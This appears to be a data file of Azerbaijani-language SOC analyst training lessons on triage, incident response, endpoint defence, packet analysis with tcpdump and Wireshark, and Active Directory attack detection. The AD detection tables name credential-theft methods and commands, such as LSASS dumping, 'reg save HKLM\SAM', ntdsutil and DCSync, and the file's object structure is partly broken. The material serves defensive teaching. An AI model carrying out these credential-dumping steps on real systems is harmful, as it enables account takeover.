{
id: "l1-triage", level: "L1", title: "Alert Triage və təhqiqat metodologiyası",
intro: "L1-in gündəlik işi: alert gələndə addım-addım nə etmək. Bu modul sənin əsas iş prosesindir.",
lessons: [
{ title: "Triage prosesi: addım-addım", html: R`
<p>Alert gələndə panika yoxdur — strukturlu yanaşma var. Bu axını əzbərlə:</p>
<ol><li><b>Oxu və anla:</b> Alert nə deyir? Hansı qayda işə düşüb? Hansı ATT&CK texnikası?</li>
<li><b>Kontekst topla:</b> Hansı host/istifadəçi? Daxili yoxsa xarici? Kritik aktivdirmi (DC, server)? İş saatıdırmı?</li>
<li><b>5W1H sualları ver:</b> Who, What, When, Where, Why, How.</li>
<li><b>Göstəriciləri (IOC) çıxar:</b> IP, domen, hash, istifadəçi, fayl adı.</li>
<li><b>Zənginləşdir (enrich):</b> IP/domen/hash-i threat intel-də yoxla (VirusTotal, AbuseIPDB, urlscan). GeoIP. Reputasiya.</li>
<li><b>Korrelyasiya:</b> Bu host/istifadəçi ilə bağlı başqa hadisələr varmı? Timeline qur.</li>
<li><b>Qərar ver:</b> False Positive? True Positive? Daha çox məlumat lazım?</li>
<li><b>Hərəkət et:</b> FP-ni sənədləşdirib bağla, TP-ni eskalasiya et/playbook icra et.</li>
<li><b>Sənədləşdir:</b> Ticket-də hər şeyi yaz — nə gördün, nə etdin, nəticə.</li></ol>
<h3>Prioritetləşdirmə (hansını əvvəl?)</h3>
<p>Həcm çoxdur, hamısına eyni vaxt verə bilməzsən. Prioritet = <b>təsir (severity) × etibarlılıq (fidelity) × aktivin kritikliyi</b>.</p>
<table><tr><th>Yüksək prioritet</th><th>Aşağı prioritet</th></tr>
<tr><td>Kritik serverdə (DC, DB) aktiv hücum</td><td>Bloklanmış tək bir skan cəhdi</td></tr>
<tr><td>Ransomware/encryption əlaməti</td><td>Köhnəlmiş imza xəbərdarlığı</td></tr>
<tr><td>Uğurlu credential access</td><td>Test mühitində səs-küy</td></tr>
<tr><td>Data exfiltration</td><td>Məlum FP nümunəsi (sənədləşdirilmiş)</td></tr></table>
<div class="tip">Zərərli görünən hər şey dərhal eskalasiya DEYİL — amma şübhə varsa və öz səviyyəndə həll edə bilmirsənsə, eskalasiya et. "Yanlış eskalasiya" buraxılmış hücumdan yaxşıdır. Komanda prosedurunu izlə.</div>`},
{ title: "Threat Intelligence alətləri ilə zənginləşdirmə", html: R`
<p>IOC-u (göstərici) öyrənmək üçün pulsuz OSINT alətləri. L1 bunları gündə dəfələrlə istifadə edir.</p>
<table><tr><th>Alət</th><th>Nə üçün</th></tr>
<tr><td><b>VirusTotal</b></td><td>Fayl hash, URL, domen, IP — çoxlu AV mühərriki + kontekst. Faylı YOX, hash-i axtar (həssas fayllar yüklənməməlidir)</td></tr>
<tr><td><b>AbuseIPDB</b></td><td>IP reputasiyası, şikayət tarixçəsi</td></tr>
<tr><td><b>urlscan.io</b></td><td>URL-i təhlükəsiz "ziyarət" edib skrinшот, resurslar, əlaqələr</td></tr>
<tr><td><b>Shodan</b></td><td>İnternetə açıq cihaz/xidmət axtarışı</td></tr>
<tr><td><b>AlienVault OTX</b></td><td>Threat intel icması, IOC pulse-ları</td></tr>
<tr><td><b>Hybrid Analysis / Joe Sandbox / any.run</b></td><td>Malware davranış analizi (sandbox)</td></tr>
<tr><td><b>MXToolbox</b></td><td>DNS, email, blacklist yoxlaması</td></tr>
<tr><td><b>GreyNoise</b></td><td>IP "internet fon səsi"dirmi (kütləvi skaner) yoxsa hədəflənmiş?</td></tr>
<tr><td><b>Censys</b></td><td>Host/sertifikat kəşfiyyatı</td></tr>
<tr><td><b>ThreatFox / MalwareBazaar (abuse.ch)</b></td><td>Məlum malware IOC-ları və nümunələri</td></tr>
<tr><td><b>Whois / DomainTools</b></td><td>Domenin yaşı, qeydiyyatçısı (yeni domen = şübhə)</td></tr></table>
<h3>IOC növləri (və "Pyramid of Pain")</h3>
<p>David Bianco-nun piramidası: hücumçu üçün dəyişdirilməsi nə qədər çətindir?</p>
<ol><li>Hash (ən asan dəyişir — bir bit kifayətdir)</li><li>IP ünvanları</li><li>Domen adları</li><li>Şəbəkə/host artefaktları</li><li>Alətlər</li><li><b>TTP</b> (ən çətin — davranışı dəyişmək hücumçuya ən bahadır)</li></ol>
<p>Nəticə: hash/IP bloklamaq asandır amma müvəqqəti; davranışa (TTP) əsaslanan aşkarlama daha davamlıdır.</p>
<div class="warn"><b>OPSEC qaydası:</b> Bəzi alətlərdə IOC-u birbaşa axtarmaq hücumçuya "aşkarlandım" siqnalı verə bilər (məs. onların C2 domenini aktiv ziyarət etmək). Təşkilatın prosedurunu izlə — passiv mənbələri (VT, passive DNS) üstün tut, aktiv probing üçün icazə al.</div>`},
{ title: "Ticket yazma və eskalasiya", html: R`
<p>SOC-da "sənədləşdirilməyən iş = görülməyən iş". Yaxşı ticket yazmaq L1-in ən vacib bacarıqlarından biridir — işə götürənlər bunu çox qiymətləndirir.</p>
<h3>Yaxşı ticketin strukturu</h3>
<ul><li><b>Başlıq:</b> qısa, dəqiq ("Possible successful brute-force on DC01 — admin account from 185.220.101.45")</li>
<li><b>Severity/Priority:</b> (Low/Medium/High/Critical)</li>
<li><b>Xülasə:</b> 2-3 cümlə — nə baş verib</li>
<li><b>Timeline:</b> vaxt damğalı hadisələr ardıcıllığı</li>
<li><b>IOC-lar:</b> IP, domen, hash, hesab, host</li>
<li><b>Dəlillər:</b> log çıxarışları, sorğu nəticələri, skrinшотlar, enrichment nəticələri (VT skoru və s.)</li>
<li><b>ATT&CK:</b> aidiyyəti texnikalar</li>
<li><b>Təhlil/Qiymət:</b> niyə TP/FP düşünürsən</li>
<li><b>Görülən tədbirlər:</b> nə etdin</li>
<li><b>Tövsiyə/Növbəti addım:</b> eskalasiya? containment?</li></ul>
<h3>Yaxşı yazı prinsipləri</h3>
<ul><li>Fakt və rəyi ayır ("185.220.101.45-dən 1247 uğursuz login <b>müşahidə olundu</b>" vs "bu <b>ehtimal ki</b> brute force-dur")</li>
<li>Aydın, qısa, jarqonsuz (növbəti analitik/menecer oxuyacaq)</li><li>UTC vaxt zonasını göstər</li><li>Təxmin etmə — bilmədiyini "naməlum" kimi qeyd et</li></ul>
<h3>Eskalasiya nə vaxt?</h3>
<ul><li>Öz səviyyəndə həll edə bilmirsən / əlavə icazə/alət lazımdır</li><li>Təsdiqlənmiş və ya yüksək ehtimallı TP</li><li>Kritik aktiv təsirlənib</li><li>Aktiv/davam edən hücum əlaməti</li><li>Containment qərarı tələb olunur (host izolyasiyası, hesab bloklama)</li></ul>
<p>Eskalasiyada: aydın xülasə, nə etdiyin, niyə eskalasiya etdiyin, hansı dəstəyin lazım olduğu. L2 sıfırdan başlamamalıdır — sənin işin üzərində qurmalıdır.</p>`},
{ title: "SOC-da ünsiyyət, növbə və peşəkar davranış", html: R`
<h3>Shift handover (növbə təhvili)</h3>
<p>Növbə dəyişəndə növbəti analitik bilməlidir: açıq/davam edən insidentlər, gözlənilən fəaliyyət (planlaşdırılmış iş, maintenance), yoxlanmalı alertlər, mühüm kontekst. Yaxşı handover olmasa, hücum "çatlaqlardan sürüşür".</p>
<h3>Analitikin dəyərli xüsusiyyətləri</h3>
<ul><li><b>Maraq və şübhəçilik:</b> "niyə?" soruşmaq, hər şeyi dəyərincə qəbul etməmək</li>
<li><b>Diqqət:</b> kiçik anomaliyalar böyük insidentlərin ilk əlamətidir</li>
<li><b>Sakitlik:</b> təzyiq altında strukturlu düşünmək</li>
<li><b>Ünsiyyət:</b> texniki şeyi aydın izah etmək</li>
<li><b>Davamlı öyrənmə:</b> təhlükələr daim dəyişir</li>
<li><b>Komanda:</b> köməyini istəmək və kömək etmək</li></ul>
<h3>Bilişsel tələlər (bunlardan qaç)</h3>
<ul><li><b>Alert fatigue:</b> çox alertdən kütləşib hamısını FP saymaq</li>
<li><b>Confirmation bias:</b> yalnız öz fərziyyəni təsdiqləyən dəlilə baxmaq</li>
<li><b>Tunnel vision:</b> bir izə o qədər fokuslanmaq ki, böyük şəkli itirmək</li>
<li><b>Normalcy bias:</b> "bizdə heç vaxt belə olmayıb, deməli indi də deyil"</li></ul>
<h3>Etika və məxfilik</h3>
<p>SOC analitik həssas məlumata (işçi fəaliyyəti, şəxsi data) çıxış əldə edir. Bu gücdən yalnız iş məqsədilə istifadə et. Araşdırdığın məlumatı sui-istifadə etmə. Hadisə məlumatını kənar şəxslərlə paylaşma. İcazəsiz sistemə heç vaxt "maraq üçün" belə girmə.</p>
<div class="note">Müsahibədə davranış sualları (behavioral): "Təzyiq altında necə işləyirsən?", "Bilmədiyin alertlə qarşılaşsan nə edərsən?", "Bir dəfə səhv etdiyin vəziyyət?" Cavablarında struktur, təvazökarlıq, öyrənmə həvəsi göstər. STAR metodu (Situation, Task, Action, Result).</div>`}
],

id: "l1-ir-endpoint", level: "L1", title: "Incident Response əsasları və endpoint təhlükəsizliyi",
intro: "İnsident həyat dövrü (NIST), containment, EDR/antivirus, firewall və endpoint hardening əsasları.",
lessons: [
{ title: "Incident Response həyat dövrü (NIST SP 800-61)", html: R`
<p>İnsident — təhlükəsizlik siyasətinin pozulması və ya real/potensial zərər. <b>Event</b> (hər hansı müşahidə) ≠ <b>Alert</b> ≠ <b>Incident</b> (təsdiqlənmiş təhlükə).</p>
<h3>NIST IR dövrü (4 faza)</h3>
<ol><li><b>Preparation (Hazırlıq):</b> alətlər, playbook-lar, komanda, təlim, loglama. İnsidentdən əvvəl.</li>
<li><b>Detection & Analysis (Aşkarlama və Təhlil):</b> alert, triage, əhatə dairəsini müəyyən etmək, təsdiqləmək. <i>L1 əsasən burada işləyir.</i></li>
<li><b>Containment, Eradication & Recovery (Məhdudlaşdırma, Təmizləmə, Bərpa):</b>
  <ul><li><b>Containment:</b> yayılmanı dayandır (host izolyasiyası, hesab blok, şəbəkə seqmentasiyası). Short-term və long-term.</li>
  <li><b>Eradication:</b> təhlükəni kökündən sil (malware, backdoor, persistence təmizlə).</li>
  <li><b>Recovery:</b> sistemləri təhlükəsiz şəkildə bərpa et, monitorinqi gücləndir.</li></ul></li>
<li><b>Post-Incident Activity (Dərslər):</b> "lessons learned", hesabat, detection/proseslərin yaxşılaşdırılması.</li></ol>
<p>SANS modeli oxşardır, 6 addım: <b>PICERL</b> — Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned.</p>
<h3>Containment qərarları (balans)</h3>
<p>Həmişə balans var: çox tez host-u söndürsən, hücumçu gizlənə və ya yaddaş dəlili itə bilər; çox gözləsən, zərər artar. Kritik sistemlərdə biznesə təsir də nəzərə alınır. Bu qərarlar adətən L2/L3 və rəhbərliklə birgə verilir — amma L1 dəlilləri toplayıb kontekst verir.</p>
<div class="warn"><b>Dəlil bütövlüyü:</b> təhqiqatda sistemləri dəyişdirmək (restart, fayl silmək) dəlili məhv edə bilər. Mümkünsə əvvəl yaddaş/disk образını al, chain of custody saxla. Bu, hüquqi proses üçün vacibdir.</div>`},
{ title: "Endpoint təhlükəsizliyi: Antivirus, EDR, XDR", html: R`
<table><tr><th></th><th>Antivirus (AV)</th><th>EDR</th><th>XDR</th></tr>
<tr><td>Yanaşma</td><td>İmza-əsaslı (məlum malware)</td><td>Davranış + telemetriya + cavab</td><td>EDR + şəbəkə, email, cloud, identity korrelyasiyası</td></tr>
<tr><td>Aşkarlama</td><td>Məlum hash/imza</td><td>Naməlum/fileless, proses ağacı</td><td>Çox mənbə</td></tr>
<tr><td>Cavab</td><td>Karantin/sil</td><td>Host izolyasiyası, proses öldürmə, uzaq araşdırma</td><td>Avtomatlaşdırılmış, geniş</td></tr></table>
<h3>EDR nə verir (L1 üçün)</h3>
<ul><li>Real-vaxt proses ağacı və əmr sətirləri</li><li>Fayl/registry/şəbəkə telemetriyası</li><li>Host izolyasiyası (bir kliklə şəbəkədən ayırmaq, amma EDR əlaqəsini saxlamaq)</li><li>Uzaq shell/forensik toplama</li><li>Detection (davranış əsaslı), IOC axtarışı</li></ul>
<p>Məşhur EDR-lər: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black, Cortex XDR. Pulsuz/açıq: Wazuh, Velociraptor (forensik), OSQuery.</p>
<h3>AV/EDR-in məhdudiyyətləri</h3>
<p>İmza-əsaslı AV yeni/obfuscated malware-i buraxa bilər. EDR güclüdür amma hücumçular onu söndürməyə/bypass etməyə çalışır (BYOVD — Bring Your Own Vulnerable Driver, EDR unhooking). EDR-in söndürülməsi və ya "tamper" alerti çox ciddidir.</p>
<div class="tip">L1 alertlərinin böyük hissəsi EDR-dən gəlir. EDR konsolunda proses ağacını oxumaq, əmr sətrini təhlil etmək və host izolyasiyası etmək əsas praktiki bacarıqdır.</div>`},
{ title: "Firewall, IDS/IPS, Proxy və şəbəkə müdafiəsi", html: R`
<h3>Firewall</h3>
<ul><li><b>Stateless</b> — hər paketi ayrı qiymətləndirir (ACL).</li><li><b>Stateful</b> — bağlantının vəziyyətini izləyir.</li>
<li><b>NGFW</b> (Next-Gen) — tətbiq-səviyyəli yoxlama, IPS, TLS inspection, istifadəçi identifikasiyası.</li>
<li><b>WAF</b> — veb tətbiqlərini L7 hücumlardan (SQLi, XSS) qoruyur.</li></ul>
<p>Firewall logları: icazə/blok, src/dst IP:port, protokol. "Deny" logları port skan və C2 cəhdlərini, "allow" logları isə normal və gizlənmiş trafiki göstərir.</p>
<h3>IDS vs IPS</h3>
<ul><li><b>IDS</b> (Detection) — aşkarlayır və xəbərdarlıq verir, bloklamır (passiv, SPAN portunda).</li>
<li><b>IPS</b> (Prevention) — inline, zərərli trafiki bloklayır.</li>
<li><b>Signature-based</b> (məlum nümunələr) vs <b>anomaly-based</b> (normaldan kənarlaşma).</li>
<li>Alətlər: <b>Snort</b>, <b>Suricata</b> (imza), <b>Zeek/Bro</b> (şəbəkə metadata/protokol loglama — NSM), <b>Security Onion</b> (hamısı bir yerdə, pulsuz).</li></ul>
<h3>Proxy / Secure Web Gateway</h3>
<p>İstifadəçi veb trafikini vasitəçi kimi keçirir: URL filtrləmə, kateqoriya blok, malware yoxlama, log. Proxy logları "istifadəçi hansı sayta getdi" sualının cavabıdır — phishing/C2 təhqiqatında əvəzsiz.</p>
<h3>Digər müdafiə qatları</h3>
<ul><li><b>DLP</b> (Data Loss Prevention) — həssas məlumatın çıxarılmasının qarşısını alır.</li>
<li><b>NAC</b> (Network Access Control) — şəbəkəyə qoşulan cihazları yoxlayır.</li>
<li><b>Honeypot</b> — hücumçunu cəlb edən tələ sistem (hər toxunuş şübhəlidir).</li>
<li><b>Email security gateway</b> — phishing/spam/malware filtrləmə.</li></ul>`},
{ title: "Endpoint hardening və müdafiə təcrübələri", html: R`
<p>Blue Team yalnız aşkarlamır — hücum səthini azaldır. L1 olaraq bu təcrübələri bilmək vacibdir, çünki alertləri kontekstə qoyur.</p>
<h3>Əsas hardening tədbirləri</h3>
<ul><li><b>Patch management:</b> OS və proqramları yenilə (ən çox istismar edilən vektor köhnə proqramdır)</li>
<li><b>Least privilege:</b> istifadəçilər admin olmasın; servis hesabları minimal hüquq</li>
<li><b>MFA hər yerdə:</b> xüsusən uzaq giriş (VPN, RDP, email)</li>
<li><b>Güclü parol siyasəti</b> və parol menecerləri; default parolları dəyiş</li>
<li><b>Lazımsız xidmətləri/portları söndür</b> (hücum səthini azalt)</li>
<li><b>Application whitelisting</b> (AppLocker, WDAC) — yalnız icazəli proqramlar işləsin</li>
<li><b>Makro məhdudiyyəti:</b> internetdən gələn Office makrolarını blokla (phishing #1 müdafiəsi)</li>
<li><b>Disk şifrələmə</b> (BitLocker/LUKS)</li>
<li><b>Backup (3-2-1 qaydası):</b> 3 nüsxə, 2 fərqli media, 1 offline/offsite — ransomware-ə qarşı ən yaxşı müdafiə</li>
<li><b>Network segmentation</b> və Zero Trust</li>
<li><b>Mərkəzi loglama</b> və monitorinq (SOC bunsuz kordur)</li></ul>
<h3>Attack surface və reduksiya</h3>
<p><b>Attack surface</b> — hücumçunun hədəf ala biləcəyi bütün nöqtələrin cəmi (açıq portlar, xidmətlər, istifadəçilər, tətbiqlər). Hardening bunu azaldır. ASR (Attack Surface Reduction) qaydaları (Microsoft Defender) ümumi hücum texnikalarını bloklayır.</p>
<h3>Vulnerability management dövrü</h3>
<p>Discover (asset inventory) → Scan (Nessus, OpenVAS, Qualys) → Prioritize (CVSS + istismar + aktivin kritikliyi) → Remediate (patch/mitigate) → Verify → Təkrar. SOC bəzən bu prosesə cəlb olunur.</p>
<div class="note">Müsahibə sualı: "Ransomware-dən ən yaxşı müdafiə nədir?" Güclü cavab: çoxqatlı — offline backup (3-2-1), MFA, patch, least privilege, makro blok, EDR, istifadəçi təlimi, network segmentation, və sürətli detection/response. Tək bir həll yoxdur.</div>`}

id: "l2-pcap", level: "L2", title: "Paket analizi: Wireshark, tcpdump, NSM",
intro: "Trafikin içini görmək. Wireshark/tcpdump ilə hücumları paket səviyyəsində aşkarlamaq.",
lessons: [
{ title: "tcpdump ilə tutma və BPF filtrləri", html: R`
<p><b>tcpdump</b> — komanda sətri paket tutucu. Serverlərdə GUI olmadıqda əvəzsizdir.</p>
<pre>tcpdump -i eth0 -nn                       # interfeys, DNS/port həlli yox
tcpdump -i eth0 -w capture.pcap           # fayla yaz
tcpdump -r capture.pcap                    # fayldan oxu
tcpdump -i eth0 -nn host 10.0.0.5          # konkret host
tcpdump -i eth0 -nn port 443               # konkret port
tcpdump -i eth0 -nn 'tcp port 80 and host 10.0.0.5'
tcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0'   # yalnız SYN
tcpdump -i eth0 -nn -A 'port 80'          # payload-u ASCII göstər
tcpdump -i eth0 -nn src 185.220.101.45    # mənbəyə görə</pre>
<h3>BPF (Berkeley Packet Filter) — capture filtrləri</h3>
<table><tr><th>Filtr</th><th>Məna</th></tr>
<tr><td>host X</td><td>X ilə əlaqəli</td></tr><tr><td>src/dst host X</td><td>mənbə/təyinat X</td></tr>
<tr><td>port X</td><td>port X</td></tr><tr><td>net 10.0.0.0/24</td><td>şəbəkə</td></tr>
<tr><td>tcp / udp / icmp</td><td>protokol</td></tr><tr><td>and / or / not</td><td>məntiq</td></tr></table>
<div class="tip">Tutma filtri (BPF) nəyin tutulacağını, display filtri (Wireshark) isə tutulanın nəyin göstəriləcəyini təyin edir — bunları qarışdırma.</div>`},
{ title: "Wireshark: display filtrləri və analiz", html: R`
<p><b>Wireshark</b> — qrafik paket analizatoru. Display filtrləri tcpdump-dan fərqlidir.</p>
<table><tr><th>Display filtri</th><th>Məna</th></tr>
<tr><td>ip.addr == 10.0.0.5</td><td>host</td></tr><tr><td>ip.src == X / ip.dst == X</td><td>mənbə/təyinat</td></tr>
<tr><td>tcp.port == 443</td><td>port</td></tr><tr><td>http</td><td>HTTP trafik</td></tr>
<tr><td>dns</td><td>DNS</td></tr><tr><td>tcp.flags.syn == 1 && tcp.flags.ack == 0</td><td>yalnız SYN</td></tr>
<tr><td>http.request.method == "POST"</td><td>POST sorğular</td></tr>
<tr><td>dns.qry.name contains "evil"</td><td>DNS adında axtarış</td></tr>
<tr><td>tcp.flags.reset == 1</td><td>RST paketlər</td></tr>
<tr><td>frame contains "password"</td><td>məzmunda axtarış</td></tr>
<tr><td>tls.handshake.extensions_server_name</td><td>TLS SNI</td></tr></table>
<h3>Faydalı funksiyalar</h3>
<ul><li><b>Follow → TCP/HTTP Stream:</b> bütün bağlantını bir axın kimi gör (credential, komanda görünür)</li>
<li><b>Statistics → Conversations:</b> kim kiminlə, nə qədər danışıb (top talkers)</li>
<li><b>Statistics → Protocol Hierarchy:</b> protokol paylanması</li>
<li><b>Statistics → Endpoints:</b> + GeoIP ilə xəritə</li>
<li><b>File → Export Objects → HTTP:</b> ötürülən faylları çıxar (endirilən malware!)</li>
<li>Rəng qaydaları: qırmızı/qara sətirlər anomaliya (RST, retransmission) göstərir</li></ul>
<h3>Paketdə hücum əlamətləri</h3>
<ul><li>Açıq mətn credential (FTP, Telnet, HTTP Basic, köhnə protokollar)</li>
<li>Qeyri-adi portlar, uzun müddətli ESTABLISHED bağlantılar (C2 beaconing)</li>
<li>Böyük outbound transfer (exfiltration)</li>
<li>Çoxlu SYN müxtəlif portlara (skan)</li>
<li>DNS-də uzun/təsadüfi subdomenlər (tunneling)</li>
<li>Düzənli intervallarla kiçik bağlantılar (beacon — məs. hər 60 saniyədə)</li></ul>`},
{ title: "C2 Beaconing və exfiltration aşkarlaması", html: R`
<h3>C2 Beaconing</h3>
<p>Malware müəyyən intervalla C2 serverinə "mən sağam, əmr varmı?" soruşur. Bu <b>müntəzəmlik (periodicity)</b> aşkarlamanın açarıdır.</p>
<ul><li><b>Əlamətlər:</b> eyni iki host arasında bərabər intervallı (məs. hər 300s ± jitter) kiçik bağlantılar; eyni ölçülü paketlər; uzun müddət davam edən əlaqə.</li>
<li><b>Jitter:</b> hücumçular aşkarlanmamaq üçün intervalı təsadüfiləşdirir (məs. 60s ± 20%).</li>
<li><b>Gizlənmə:</b> 443 (HTTPS), domain fronting, legitim xidmətlər (Slack, Discord, GitHub, Telegram API-ləri) üzərindən C2.</li>
<li><b>Aşkarlama:</b> bağlantı vaxtlarının fərqini (delta) hesablayıb standart sapmaya bax (RITA, Zeek + analiz, SIEM-də aggregation). JA3, qeyri-adi User-Agent, yeni/nadir domen.</li></ul>
<h3>Data Exfiltration</h3>
<ul><li>Böyük <b>outbound</b> həcm (download-dan çox upload — anomal)</li>
<li>Qeyri-iş saatlarında transfer</li><li>Tanınmayan bulud saxlama/fayl paylaşım saytlarına yükləmə</li>
<li>DNS/ICMP tunneling (kiçik hissələrlə)</li><li>Şifrəli arxivlərin göndərilməsi</li></ul>
<h3>Zeek (NSM) nümunə logları</h3>
<p>Zeek paket deyil, zəngin <b>metadata loglar</b> yaradır: <code>conn.log</code> (bütün bağlantılar + müddət + byte), <code>dns.log</code>, <code>http.log</code>, <code>ssl.log</code> (JA3, SNI, sertifikat), <code>files.log</code>, <code>notice.log</code>. Böyük həcmdə trafik analizi üçün paketdən praktikdir.</p>
<pre># conn.log-da uzun/böyük bağlantıları tapmaq (sadələşdirilmiş)
cat conn.log | zeek-cut id.orig_h id.resp_h duration orig_bytes resp_bytes \
  | sort -k4 -rn | head    # ən uzun bağlantılar = potensial C2</pre>
<div class="note">Threat hunting-də "uzun müddət + az data + müntəzəm interval + nadir təyinat" kombinasiyası klassik beacon imzasıdır. Cobalt Strike, Metasploit, Sliver kimi C2 freymvorkları bu cür davranır.</div>`},
{ title: "Praktiki pcap təhqiqatı", html: R`
<p>Real təhqiqatda pcap-a baxanda strukturlu yanaşma:</p>
<ol><li><b>Ümumi mənzərə:</b> Statistics → Conversations/Protocol Hierarchy. Kim var, hansı protokollar?</li>
<li><b>Top talkers:</b> ən çox trafik kimdə? Anomal həcm?</li>
<li><b>DNS:</b> hansı domenlər sorğulanıb? Şübhəli/yeni/təsadüfi var?</li>
<li><b>HTTP:</b> hansı URL-lər, User-Agent-lər, POST-lar? Fayl endirmələri?</li>
<li><b>TLS:</b> hansı SNI-lər, sertifikatlar, JA3-lər?</li>
<li><b>Fayl çıxarışı:</b> Export Objects — hansı fayllar ötürülüb?</li>
<li><b>Stream takibi:</b> şübhəli bağlantıları Follow Stream ilə oxu</li>
<li><b>IOC çıxar:</b> IP, domen, hash, URL — TI-də yoxla</li></ol>
<h3>Faydalı iş axınları</h3>
<ul><li>Açıq mətn parol axtarışı: <code>http.authbasic</code> və ya Follow Stream-də credential</li>
<li>Endirilən .exe: <code>http.response.line</code> + Export Objects → HTTP</li>
<li>Şübhəli DNS: <code>dns.qry.name</code> sütununa görə sırala, uzunları tap</li>
<li>Exfiltration: Conversations-da outbound bytes-a görə sırala</li></ul>
<div class="tip">Təcrübə üçün pulsuz pcap-lar: <b>malware-traffic-analysis.net</b> (real malware pcap + tapşırıqlar), Wireshark Sample Captures, CyberDefenders və Blue Team Labs Online "network forensics" tapşırıqları. Bu saytlar müsahibəyə hazırlıq üçün qızıldır.</div>`}
],

lessons: [
{ title: "AD recon və credential access", html: R`
<h3>Enumeration (kəşfiyyat) — T1087, T1069, T1482</h3>
<p>Hücumçu AD-yə düşən kimi mühiti xəritələyir: istifadəçilər, qruplar, kompüterlər, etibarlar, ACL-lər. Alətlər: <b>BloodHound/SharpHound</b> (hücum yollarını qrafik göstərir), <code>net</code> əmrləri, <code>PowerView</code>, LDAP sorğuları, <code>nltest</code>, <code>setspn</code>.</p>
<p><b>Aşkarlama:</b> qısa müddətdə kütləvi LDAP sorğuları (Event 1644 və ya şəbəkə), anormal SAMR/LSARPC trafiki, bir host-dan çox sayda hesaba sorğu. Honeypot hesab/obyektlər (canary) toxunulanda alert.</p>
<h3>Credential Access — T1003</h3>
<table><tr><th>Texnika</th><th>Təsvir</th><th>Aşkarlama</th></tr>
<tr><td>LSASS dump (T1003.001)</td><td>lsass.exe yaddaşından parollar/hashlər (Mimikatz, comsvcs.dll, Task Manager dump)</td><td>Sysmon 10: lsass-a GrantedAccess 0x1010/0x1410; qeyri-adi proses lsass-a girir</td></tr>
<tr><td>SAM/SYSTEM (T1003.002)</td><td>Reg save ilə SAM hive</td><td>reg save HKLM\SAM; VSS copy</td></tr>
<tr><td>NTDS.dit (T1003.003)</td><td>DC-dən bütün domen hashləri</td><td>ntdsutil, vssadmin, DC-də qeyri-adi fayl girişi</td></tr>
<tr><td>DCSync (T1003.006)</td><td>DC kimi davranıb replikasiya ilə hash istə</td><td>Event 4662 (Replicating Directory Changes) qeyri-DC hesabdan!</td></tr>
<tr><td>Credential in files/GPP</td><td>Skript, GPP cpassword, memory</td><td>Fayl girişi</td></tr></table>
<div class="warn">Mimikatz və LSASS dump SOC-un ən kritik alertlərindəndir. lsass.exe-yə qeyri-adi proses girişi (Sysmon Event 10) dərhal araşdırılmalıdır.</div>`},
{ title: "Kerberos hücumları", html: R`
<p>Kerberos AD autentifikasiya protokoludur. Əsas hücumlar:</p>
<h3>Kerberoasting (T1558.003)</h3>
<p>Hücumçu SPN-i olan servis hesablarının service ticket-ini (TGS) istəyir, bu bilet servis hesabının parol hash-i ilə şifrələnib. Offline qırıb parolu tapır (servis hesabları çox vaxt zəif parollu).</p>
<ul><li><b>Əlamət:</b> bir hesabdan qısa müddətdə çoxlu <b>Event 4769</b> (TGS request), xüsusən zəif şifrələmə (RC4/0x17) tələbi. <code>setspn -q</code>, GetUserSPNs istifadəsi.</li></ul>
<h3>AS-REP Roasting (T1558.004)</h3>
<p>"Kerberos pre-authentication" söndürülmüş hesablar üçün AS-REP istənir və offline qırılır.</p>
<ul><li><b>Əlamət:</b> Event 4768 pre-auth olmayan hesablar üçün, RC4.</li></ul>
<h3>Pass-the-Hash (T1550.002) və Pass-the-Ticket (T1550.003)</h3>
<p>Parol əvəzinə NTLM hash (PtH) və ya Kerberos bilet (PtT) ilə autentifikasiya. Oğurlanmış credential-la lateral movement.</p>
<ul><li><b>Əlamət:</b> qeyri-adi NTLM istifadəsi (4776), bir hostdan çox hostʼa eyni hesabla şəbəkə logon (4624 Type 3), eyni biletin fərqli maşınlarda istifadəsi.</li></ul>
<h3>Golden/Silver Ticket (T1558.001/002)</h3>
<ul><li><b>Golden Ticket:</b> krbtgt hash-i ilə saxta TGT yaratmaq → istənilən istifadəçi/hüquq, uzunömürlü. DC tam kompromisi deməkdir.</li>
<li><b>Silver Ticket:</b> servis hesabı hash-i ilə saxta TGS → konkret xidmətə giriş.</li>
<li><b>Əlamət:</b> anormal bilet ömrü, mövcud olmayan hesab üçün bilet, 4769 anomaliyaları, krbtgt istifadəsi. (Aşkarlama çətindir — krbtgt parolunu mütəmadi dəyişmək vacibdir.)</li></ul>
<div class="note">Vacib Event ID-lər: <b>4768</b> TGT istəndi, <b>4769</b> TGS istəndi (Kerberoasting!), <b>4770</b> TGS yeniləndi, <b>4771</b> pre-auth uğursuz, <b>4776</b> NTLM. Encryption type 0x17 = RC4 (zəif, hücum əlaməti), 0x12 = AES256 (normal).</div>`},
{ title: "Lateral Movement və Persistence (AD)", html: R`
<h3>Lateral Movement texnikaları — TA0008</h3>
<table><tr><th>Texnika</th><th>Port/əlamət</th><th>Aşkarlama</th></tr>
<tr><td>RDP (T1021.001)</td><td>3389</td><td>4624 Type 10; qeyri-adi mənbə/vaxt</td></tr>
<tr><td>SMB/Admin shares + PsExec (T1021.002, T1569.002)</td><td>445; ADMIN$, C$</td><td>7045 servis quraşdırma; PSEXESVC; 4624 Type 3; 5140 share access</td></tr>
<tr><td>WMI (T1047)</td><td>135 + dinamik</td><td>WmiPrvSE.exe child proses; qeyri-adi uzaq WMI</td></tr>
<tr><td>WinRM/PowerShell Remoting (T1021.006)</td><td>5985/5986</td><td>wsmprovhost.exe; 4624; PowerShell logları</td></tr>
<tr><td>Scheduled Task uzaqdan (T1053.005)</td><td>—</td><td>4698 başqa hostdan</td></tr>
<tr><td>Pass-the-Hash</td><td>—</td><td>NTLM anomaliyası</td></tr></table>
<h3>Persistence (AD mühitində) — TA0003</h3>
<ul><li>Yeni hesab yaratmaq (4720) və ya mövcud hesaba imtiyaz vermək (4728/4732/4756 — admin qrupuna əlavə)</li>
<li>GPO manipulyasiyası (hamıya təsir edir)</li><li>AdminSDHolder, DCShadow (qabaqcıl)</li>
<li>Service/Scheduled task (7045, 4698)</li><li>Skeleton Key, DSRM</li>
<li>SIDHistory injection</li></ul>
<h3>Privilege Escalation (AD)</h3>
<ul><li>Kerberoasting → servis hesabı parolu → daha çox hüquq</li><li>ACL sui-istifadəsi (BloodHound yolları: GenericAll, WriteDacl)</li>
<li>Unconstrained/Constrained delegation sui-istifadəsi</li><li>Zerologon (CVE-2020-1472), PrintNightmare, noPac kimi CVE-lər</li></ul>
